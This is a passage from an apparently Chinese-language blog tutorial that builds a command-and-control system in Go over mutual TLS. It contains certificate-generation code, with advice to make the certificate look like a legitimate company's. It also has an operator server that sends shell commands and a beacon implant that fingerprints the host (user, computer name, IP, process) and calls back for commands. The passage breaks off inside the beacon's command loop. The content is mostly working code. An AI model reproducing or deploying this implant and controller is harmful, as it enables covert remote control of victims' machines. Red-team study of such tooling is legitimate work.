class="literal">true</span>,  </span><br><span class="line">       IPAddresses: []net.IP&#123;  </span><br><span class="line">          net.IPv4(<span class="number">127</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>),  </span><br><span class="line">          net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">3</span>, <span class="number">1</span>),  </span><br><span class="line">          net.IPv4(<span class="number">203</span>, <span class="number">0</span>, <span class="number">113</span>, <span class="number">1</span>), <span class="comment">// RFC 5737 æµ‹è¯•åœ°å€  </span></span><br><span class="line">       &#125;,  </span><br><span class="line">    &#125;  </span><br><span class="line">    caCertDER, _ := x509.CreateCertificate(rand.Reader, caTmpl, caTmpl, &amp;caPriv.PublicKey, caPriv)  </span><br><span class="line">    caCert, _ := x509.ParseCertificate(caCertDER)  </span><br><span class="line">    saveCert(<span class="string">&quot;ca.pem&quot;</span>, caCertDER)  </span><br><span class="line">    saveKey(<span class="string">&quot;ca-key.pem&quot;</span>, caPriv)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// ç”Ÿæˆserverçš„ç§é’¥å’Œè¯ä¹¦ï¼Œç”¨CAçš„ç§é’¥ç­¾å‘serverçš„è¯ä¹¦  </span></span><br><span class="line">    servPriv, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)  </span><br><span class="line">    servTmpl := &amp;x509.Certificate&#123;  </span><br><span class="line">       SerialNumber: <span class="built_in">new</span>(big.Int).SetBytes(randomBytes(<span class="number">20</span>)),  </span><br><span class="line">       Subject: pkix.Name&#123;  </span><br><span class="line">          Organization: []<span class="type">string</span>&#123;orgName&#125;,  </span><br><span class="line">          Country:      []<span class="type">string</span>&#123;<span class="string">&quot;US&quot;</span>&#125;,  </span><br><span class="line">          Locality:     []<span class="type">string</span>&#123;<span class="string">&quot;Redmond&quot;</span>&#125;,  </span><br><span class="line">       &#125;,  </span><br><span class="line">       NotBefore: time.Now(), NotAfter: time.Now().AddDate(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>),  </span><br><span class="line">       KeyUsage:    x509.KeyUsageDigitalSignature,  </span><br><span class="line">       ExtKeyUsage: []x509.ExtKeyUsage&#123;x509.ExtKeyUsageServerAuth&#125;,  </span><br><span class="line">       IPAddresses: []net.IP&#123;  </span><br><span class="line">          net.IPv4(<span class="number">127</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>),  </span><br><span class="line">          net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">3</span>, <span class="number">1</span>),  </span><br><span class="line">          net.IPv4(<span class="number">203</span>, <span class="number">0</span>, <span class="number">113</span>, <span class="number">2</span>), <span class="comment">// &lt;-- RFC 5737 æ–‡æ¡£å…¬ç½‘  </span></span><br><span class="line">       &#125;,  </span><br><span class="line">    &#125;  </span><br><span class="line">    servDER, _ := x509.CreateCertificate(rand.Reader, servTmpl, caCert, &amp;servPriv.PublicKey, caPriv)  </span><br><span class="line">    saveCert(<span class="string">&quot;server.pem&quot;</span>, servDER)  </span><br><span class="line">    saveKey(<span class="string">&quot;server-key.pem&quot;</span>, servPriv)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// ç”Ÿæˆclientçš„ç§é’¥å’Œè¯ä¹¦ï¼Œç”¨CAçš„ç§é’¥ç­¾å‘clientçš„è¯ä¹¦  </span></span><br><span class="line">    cliPriv, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)  </span><br><span class="line">    cliTmpl := &amp;x509.Certificate&#123;  </span><br><span class="line">       SerialNumber: <span class="built_in">new</span>(big.Int).SetBytes(randomBytes(<span class="number">20</span>)),  </span><br><span class="line">       Subject: pkix.Name&#123;  </span><br><span class="line">          Organization: []<span class="type">string</span>&#123;orgName&#125;, <span class="comment">// å›ºå®šå€¼  </span></span><br><span class="line">          Country:      []<span class="type">string</span>&#123;<span class="string">&quot;US&quot;</span>&#125;,  </span><br><span class="line">          Locality:     []<span class="type">string</span>&#123;<span class="string">&quot;Redmond&quot;</span>&#125;,  </span><br><span class="line">       &#125;,  </span><br><span class="line">       NotBefore: time.Now(), NotAfter: time.Now().AddDate(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>),  </span><br><span class="line">       KeyUsage:    x509.KeyUsageDigitalSignature,  </span><br><span class="line">       ExtKeyUsage: []x509.ExtKeyUsage&#123;x509.ExtKeyUsageClientAuth&#125;, <span class="comment">// å¿…é¡»ä¸º ClientAuth    &#125;  </span></span><br><span class="line">    cliDER, _ := x509.CreateCertificate(rand.Reader, cliTmpl, caCert, &amp;cliPriv.PublicKey, caPriv)  </span><br><span class="line">    saveCert(<span class="string">&quot;client.pem&quot;</span>, cliDER)  </span><br><span class="line">    saveKey(<span class="string">&quot;client-key.pem&quot;</span>, cliPriv)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">randomBytes</span><span class="params">(n <span class="type">int</span>)</span></span> []<span class="type">byte</span> &#123;  </span><br><span class="line">    b := <span class="built_in">make</span>([]<span class="type">byte</span>, n)  </span><br><span class="line">    rand.Read(b)  </span><br><span class="line">    <span class="keyword">return</span> b  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">saveCert</span><span class="params">(name <span class="type">string</span>, der []<span class="type">byte</span>)</span></span> &#123;  </span><br><span class="line">    f, _ := os.Create(name)  </span><br><span class="line">    pem.Encode(f, &amp;pem.Block&#123;Type: <span class="string">&quot;CERTIFICATE&quot;</span>, Bytes: der&#125;)  </span><br><span class="line">    f.Close()  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">saveKey</span><span class="params">(name <span class="type">string</span>, key *ecdsa.PrivateKey)</span></span> &#123;  </span><br><span class="line">    b, _ := x509.MarshalECPrivateKey(key)  </span><br><span class="line">    f, _ := os.Create(name)  </span><br><span class="line">    pem.Encode(f, &amp;pem.Block&#123;Type: <span class="string">&quot;EC PRIVATE KEY&quot;</span>, Bytes: b&#125;)  </span><br><span class="line">    f.Close()  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªä»£ç ç”¨æ¥ç»™æµ‹è¯•ç¯å¢ƒå¿«é€Ÿç”Ÿæˆä¸‰å¥—TLSæ–‡ä»¶ã€‚</p>
<ol>
<li>è‡ªç­¾åçš„ CA è¯ä¹¦&#x2F;å¯†é’¥ï¼ˆca.pem&#x2F;ca-key.pemï¼‰</li>
<li>æœåŠ¡å™¨è¯ä¹¦&#x2F;å¯†é’¥ï¼ˆserver.pem&#x2F;server-key.pemï¼‰ï¼Œç”±CAç­¾å‘</li>
<li>å®¢æˆ·ç«¯è¯ä¹¦&#x2F;å¯†é’¥ï¼ˆclient.pem&#x2F;client-key.pemï¼‰ï¼Œç”±CAç­¾å‘</li>
</ol>
<p>è¿™é‡Œè¦è¯´ä¸€ä¸‹IPåœ°å€å†™è¿›è¯ä¹¦å±äº <strong>Subject Alternative Nameï¼ˆSANï¼‰</strong> çš„ä¸€ç§å†™æ³•ï¼Œè¯ä¹¦SANé‡Œçš„IPæ˜¯ â€œæˆ‘æä¾›çš„èº«ä»½â€ï¼Œå®ƒçš„ç”¨å¤„æ˜¯åªè¦å¯¹ç«¯ç”¨è¿™å‡ ä¸ªIPåœ°å€ä¸­çš„ä»»ä½•ä¸€ä¸ªæ¥è¿æˆ‘ï¼Œå°±ç®—åç§°åŒ¹é…ï¼Œæ¡æ‰‹ç»§ç»­ã€‚</p>
<p>æ¯”å¦‚è¯´client-&gt;serverï¼Œserverçš„è¯ä¹¦IP SANæ˜¯ <code>192.168.3.1ï¼ˆserverçœŸå®çš„ipåœ°å€ï¼‰</code>ï¼Œclientå¯¹ <code>192.168.3.1</code> å‘èµ·è¿æ¥ï¼Œåˆ™clientä¸æŠ¥é”™ï¼›è‹¥serverçš„è¯ä¹¦IP SANæ˜¯ <code>192.168.3.2</code>ï¼Œclientå¯¹ <code>192.168.3.1</code> å‘èµ·è¿æ¥ï¼Œå› ä¸º <code>192.168.3.1</code> ä¸ç¬¦åˆserverçš„è¯ä¹¦IP SANï¼Œæ•…clientæŠ¥è¯ä¹¦éªŒè¯é”™è¯¯ã€‚server-&gt;clientçš„ä¹Ÿæ˜¯åŒç†ã€‚ä¸‹å›¾å°±æ˜¯clientéªŒè¯serverè¯ä¹¦å¤±è´¥åçš„ç»“æœã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/13/18-55-58-c5bda708572da69902f97196e3fd1bae-20250913185558-e101c4.png"></p>
<p>å…¶ä½™å€¼å¾—è¯´æ˜çš„æ˜¯Subjectå­—æ®µï¼Œè¿™é‡ŒåŒ…å«äº†Countryã€Organization ã€Localityã€ Provinceç­‰ç›¸å…³ä¿¡æ¯ï¼Œå¯ä»¥å°†è¿™äº›ä¿¡æ¯å°½å¯èƒ½è´´è¿‘å®é™…ç”Ÿæ´»ï¼Œçœ‹èµ·æ¥åƒæ­£è§„å…¬å¸å‡ºå“çš„è¯ä¹¦ã€‚</p>
<h3 id="2-2-2-Server"><a href="#2-2-2-Server" class="headerlink" title="2.2.2 Server"></a>2.2.2 Server</h3><p><code>server.go</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;bufio&quot;</span>  </span><br><span class="line">    <span class="string">&quot;crypto/tls&quot;</span>    </span><br><span class="line">    <span class="string">&quot;crypto/x509&quot;</span>    </span><br><span class="line">    <span class="string">&quot;errors&quot;</span>    </span><br><span class="line">    <span class="string">&quot;fmt&quot;</span>    </span><br><span class="line">    <span class="string">&quot;io&quot;</span>    </span><br><span class="line">    <span class="string">&quot;log&quot;</span>    </span><br><span class="line">    <span class="string">&quot;mtls/utils&quot;</span>    </span><br><span class="line">    <span class="string">&quot;net&quot;</span>    </span><br><span class="line">    <span class="string">&quot;os&quot;</span>    </span><br><span class="line">    <span class="string">&quot;strings&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> (  </span><br><span class="line">    listenAddr = <span class="string">&quot;192.168.3.1:9443&quot;</span>  </span><br><span class="line">    caCert     = <span class="string">&quot;ca.pem&quot;</span>  </span><br><span class="line">    serverCert = <span class="string">&quot;server.pem&quot;</span>  </span><br><span class="line">    serverKey  = <span class="string">&quot;server-key.pem&quot;</span>  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">    ln, err := ListenerStart(listenAddr)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Fatalf(<span class="string">&quot;listener start: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">    log.Printf(<span class="string">&quot;mTLS listener started on %s&quot;</span>, listenAddr)  </span><br><span class="line">    acceptConnections(ln)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// å¯åŠ¨ mTLS ç›‘å¬å™¨  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ListenerStart</span><span class="params">(addr <span class="type">string</span>)</span></span> (net.Listener, <span class="type">error</span>) &#123;  </span><br><span class="line">    <span class="comment">// åŠ è½½æœåŠ¡å™¨è¯ä¹¦  </span></span><br><span class="line">    cert, err := tls.LoadX509KeyPair(serverCert, serverKey)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, err  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">// åŠ è½½CAå¹¶æ”¾å…¥æ±   </span></span><br><span class="line">    caPEM, err := os.ReadFile(caCert)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, err  </span><br><span class="line">    &#125;  </span><br><span class="line">    pool := x509.NewCertPool()  </span><br><span class="line">    <span class="keyword">if</span> !pool.AppendCertsFromPEM(caPEM) &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;failed to parse CA certificate&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">// TLSé…ç½®ï¼šå¼ºåˆ¶åŒå‘TLS 1.3  </span></span><br><span class="line">    tlsConfig := &amp;tls.Config&#123;  </span><br><span class="line">       Certificates: []tls.Certificate&#123;cert&#125;,  </span><br><span class="line">       ClientAuth:   tls.RequireAndVerifyClientCert, <span class="comment">//mTLSä¸TLSçš„å…³é”®åŒºåˆ«  </span></span><br><span class="line">       ClientCAs:    pool,  </span><br><span class="line">       MinVersion:   tls.VersionTLS13,  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> tls.Listen(<span class="string">&quot;tcp&quot;</span>, addr, tlsConfig)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// æ¥å—æ–°è¿æ¥  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">acceptConnections</span><span class="params">(listener net.Listener)</span></span> &#123;  </span><br><span class="line">    <span class="keyword">for</span> &#123;  </span><br><span class="line">       rawConn, err := listener.Accept()  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="comment">// ç›‘å¬å™¨è¢«å…³é—­  </span></span><br><span class="line">          <span class="keyword">if</span> opErr, ok := err.(*net.OpError); ok &amp;&amp; opErr.Op == <span class="string">&quot;accept&quot;</span> &#123;  </span><br><span class="line">             <span class="keyword">break</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">          log.Printf(<span class="string">&quot;accept error: %v&quot;</span>, err)  </span><br><span class="line">          <span class="keyword">continue</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">       log.Printf(<span class="string">&quot;new connection from %s&quot;</span>, rawConn.RemoteAddr())  </span><br><span class="line">       <span class="keyword">go</span> handleConnection(rawConn)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// å¤„ç†å•æ¡è¿æ¥  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleConnection</span><span class="params">(conn net.Conn)</span></span> &#123;  </span><br><span class="line">    <span class="keyword">defer</span> conn.Close()  </span><br><span class="line">    <span class="keyword">for</span> &#123;  </span><br><span class="line">       <span class="comment">// 1. è¯»ä¸€æ¡Beaconè¾“å‡º  </span></span><br><span class="line">       data, err := utils.ReadFrame(conn)  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">if</span> err != io.EOF &#123;  </span><br><span class="line">             log.Printf(<span class="string">&quot;read error: %v&quot;</span>, err)  </span><br><span class="line">          &#125;  </span><br><span class="line">          <span class="keyword">return</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">       log.Printf(<span class="string">&quot;output: %s\n&quot;</span>, <span class="type">string</span>(data))  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 2. ä»æ ‡å‡†è¾“å…¥è¯»ä¸€æ¡å‘½ä»¤  </span></span><br><span class="line">       fmt.Print(<span class="string">&quot;Cmd&gt;&gt;&gt; &quot;</span>)  </span><br><span class="line">       cmdLine, _ := bufio.NewReader(os.Stdin).ReadString(<span class="string">&#x27;\n&#x27;</span>)  </span><br><span class="line">       cmdLine = strings.TrimRight(cmdLine, <span class="string">&quot;\r\n&quot;</span>)  </span><br><span class="line">       <span class="keyword">if</span> cmdLine == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">          <span class="keyword">continue</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 3. ä¸‹å‘å‘½ä»¤  </span></span><br><span class="line">       <span class="keyword">if</span> err := utils.WriteFrame(conn, []<span class="type">byte</span>(cmdLine)); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          log.Printf(<span class="string">&quot;write error: %v&quot;</span>, err)  </span><br><span class="line">          <span class="keyword">return</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ListenerStart</strong>ï¼šè¯»å–serverçš„ç§é’¥å’Œè¯ä¹¦ä»¥åŠCAçš„è¯ä¹¦ï¼Œå®ŒæˆTLSçš„é…ç½®ï¼ˆå…¶ä¸­ï¼‰ï¼Œ<code>ClientAuth: RequireAndVerifyClientCert</code> æ˜¯ <strong>mTLSä¸å•å‘TLSå”¯ä¸€åŒºåˆ«</strong>ï¼šæ¡æ‰‹é˜¶æ®µæœåŠ¡å™¨ä¼šå‘ ã€‚<strong>CertificateRequest</strong>ï¼Œå®¢æˆ·ç«¯å¿…é¡»å›è¯ä¹¦ä¸”é€šè¿‡ <code>ClientCAsï¼ˆCAéªŒè¯ï¼‰</code> æ ¡éªŒé“¾ã€‚å®Œæˆé…ç½®ä¹‹åå°±å¯ä»¥ä½¿ç”¨tls.Listenå¿«é€Ÿåœ°åˆ›å»ºç›‘å¬å™¨äº†ã€‚</p>
<p><strong>acceptConnections</strong>ï¼šæ¯æ¥ä¸€æ¡è¿æ¥å°±åˆ›å»ºä¸€ä¸ªgoroutineï¼Œç”±handleConnectionæ¥å¤„ç†ã€‚</p>
<p><strong>handleConnection</strong>ï¼šäº¤äº’å¼shellï¼Œå¯ä»¥ä¸‹å‘å‘½ä»¤å’Œè¯»å–Beaconå›ä¼ çš„æ•°æ®ï¼Œå…¶ä¸­åˆ©ç”¨åˆ°äº†å·¥å…·å‡½æ•°çš„ <code>ReadFrame</code> å’Œ <code>WriteFrame</code> ä»socketä¸­è¯»å†™æ•°æ®ï¼Œæ”¯æŒ8192Båˆ†å—ï¼Œå¤§å›æ˜¾ä¹Ÿä¸ä¼šç‚¸å†…å­˜ã€‚</p>
<p>çœ‹çœ‹æ‰§è¡Œæ•ˆæœï¼Œä¸‹å›¾serveræ§åˆ¶è¾“å…¥ipconfigå‘½ä»¤åçš„å›æ˜¾</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/13/21-07-45-f6913f74998b6f77038c1c5fd9472ce1-20250913210744-fd095b.png"></p>
<h3 id="2-2-3-Beacon"><a href="#2-2-3-Beacon" class="headerlink" title="2.2.3 Beacon"></a>2.2.3 Beacon</h3><p><code>beacon.go</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;crypto/tls&quot;</span>  </span><br><span class="line">    <span class="string">&quot;crypto/x509&quot;</span>    </span><br><span class="line">    <span class="string">&quot;encoding/json&quot;</span>    </span><br><span class="line">    <span class="string">&quot;io&quot;</span>    </span><br><span class="line">    <span class="string">&quot;log&quot;</span>    </span><br><span class="line">    <span class="string">&quot;math/rand/v2&quot;</span>    </span><br><span class="line">    <span class="string">&quot;mtls/utils&quot;</span>    </span><br><span class="line">    <span class="string">&quot;os&quot;</span>    </span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span>    </span><br><span class="line">    <span class="string">&quot;strings&quot;</span>    <span class="comment">// é•¿åº¦å‰ç¼€è¯»å†™å‡½æ•°ä¿æŒåŸæ ·  </span></span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> BeaconConfig <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Sleep           <span class="type">int32</span>  </span><br><span class="line">    Jitter          <span class="type">int32</span>  </span><br><span class="line">    CallBackAddress <span class="type">string</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> HeartBeat <span class="keyword">struct</span> &#123;  </span><br><span class="line">    BeaconId    <span class="type">int32</span>  <span class="string">`json:&quot;beacon_id&quot;`</span>  </span><br><span class="line">    Sleep       <span class="type">int32</span>  <span class="string">`json:&quot;sleep&quot;`</span>  </span><br><span class="line">    Jitter      <span class="type">int32</span>  <span class="string">`json:&quot;jitter&quot;`</span>  </span><br><span class="line">    PID         <span class="type">int32</span>  <span class="string">`json:&quot;pid&quot;`</span>  </span><br><span class="line">    ACP         <span class="type">int32</span>  <span class="string">`json:&quot;acp&quot;`</span>  </span><br><span class="line">    InternalIP  <span class="type">int32</span>  <span class="string">`json:&quot;internal_ip&quot;`</span>  </span><br><span class="line">    Computer    <span class="type">string</span> <span class="string">`json:&quot;computer&quot;`</span>  </span><br><span class="line">    Username    <span class="type">string</span> <span class="string">`json:&quot;username&quot;`</span>  </span><br><span class="line">    ProcessName <span class="type">string</span> <span class="string">`json:&quot;process_name&quot;`</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> beaconProfile = BeaconConfig&#123;  </span><br><span class="line">    Sleep:           <span class="number">5</span>,  </span><br><span class="line">    Jitter:          <span class="number">2</span>,  </span><br><span class="line">    CallBackAddress: <span class="string">&quot;192.168.3.1:9443&quot;</span>,  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> heartBeat = HeartBeat&#123;  </span><br><span class="line">    BeaconId:    rand.Int32(),  </span><br><span class="line">    Sleep:       beaconProfile.Sleep,  </span><br><span class="line">    Jitter:      beaconProfile.Jitter,  </span><br><span class="line">    PID:         <span class="type">int32</span>(os.Getpid()),  </span><br><span class="line">    ACP:         utils.GetCodePageANSI(),  </span><br><span class="line">    InternalIP:  <span class="type">int32</span>(utils.GetInternalIp()),  </span><br><span class="line">    Computer:    utils.GetComputerName(),  </span><br><span class="line">    Username:    utils.GetUsername(),  </span><br><span class="line">    ProcessName: utils.GetProcessName(),  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">    cert, _ := tls.LoadX509KeyPair(<span class="string">&quot;client.pem&quot;</span>, <span class="string">&quot;client-key.pem&quot;</span>)  </span><br><span class="line">    caPEM, _ := os.ReadFile(<span class="string">&quot;ca.pem&quot;</span>)  </span><br><span class="line">    pool := x509.NewCertPool()  </span><br><span class="line">    pool.AppendCertsFromPEM(caPEM)  </span><br><span class="line">    conn, err := tls.Dial(<span class="string">&quot;tcp&quot;</span>, beaconProfile.CallBackAddress, &amp;tls.Config&#123;  </span><br><span class="line">       Certificates: []tls.Certificate&#123;cert&#125;,  </span><br><span class="line">       RootCAs:      pool,  </span><br><span class="line">       ServerName:   <span class="string">&quot;192.168.3.1&quot;</span>,  </span><br><span class="line">       MinVersion:   tls.VersionTLS13,  </span><br><span class="line">    &#125;)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Fatalf(<span class="string">&quot;dial: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">defer</span> conn.Close()  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 1. å…ˆç»™æœåŠ¡å™¨å‘ä¸ªâ€œä¸Šçº¿åŒ…  </span></span><br><span class="line">    data, err := json.Marshal(heartBeat)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       err = utils.WriteFrame(conn, []<span class="type">byte</span>(err.Error()))  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          log.Fatalf(<span class="string">&quot;send online: %v&quot;</span>, err)  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> err := utils.WriteFrame(conn, data); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Fatalf(<span class="string">&quot;send online: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 2. å¾ªç¯ç­‰å‘½ä»¤  </span></span><br><span class="line">    <span class="keyword">for</span> &#123;  </span><br><span class="line">       cmdLine, err := utils.ReadFrame(conn)  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">if</span> err == io.EOF &#123;  </span><br><span class="line">             log.Println(<span class="string">&quot;server gone&quot;</span>)  </span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">             log.Printf(<span class="string">&quot;read: %v&quot;</span>, err)  </span><br><span class="line">          &#125;  </span><br><span class="line">          <span class="keyword">return</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       cmd := strings.TrimRight(<span class="type">string</span>(cmdLine), <span class="string">&quot;\r\n&quot;</span>)  